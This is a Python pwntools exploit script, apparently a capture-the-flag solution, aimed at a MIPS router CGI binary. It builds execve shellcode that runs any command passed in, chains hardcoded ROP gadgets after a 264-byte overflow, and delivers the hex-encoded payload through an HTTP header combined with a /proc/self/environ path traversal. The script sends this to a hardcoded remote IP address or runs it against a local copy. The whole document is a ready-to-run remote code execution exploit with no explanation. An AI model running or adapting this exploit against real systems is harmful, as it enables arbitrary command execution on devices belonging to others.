from pwn import *
import sys
import requests

context.update(arch="mips", bits=32, endian="big", os="linux")

if len(sys.argv)<3:
    print('python sploit.py local|remote cmd')
    exit()


path = '/bin/sh'
argv = ['sh', '-c', sys.argv[2]]
envp = {}
shellcode = shellcraft.mips.linux.execve(path, argv, envp)
shellcode = asm(shellcode)

gadget1=0x004745F4
gadget2=0x0040DCA4
gadget3=0x00423774 

buff  = ("A"*264).encode()
buff += p32(gadget1) + ("A" * 0x1c).encode() + (p32(gadget3)*4) + p32(gadget2) + ('\x00' * 56).encode() + shellcode
buff  = '=HEX='+(buff.hex())+'=HEX='

if(sys.argv[1]=='local'):
    env={'QUERY_STRING':'/a=../../../../../../proc/self/environ','PWN':buff}
    p = process('./router.bin',env=env)
    p.interactive()

else:
    requests.get("http://159.65.199.231/router.bin?a=../../../../../../proc/self/environ",headers={'PWN':buff})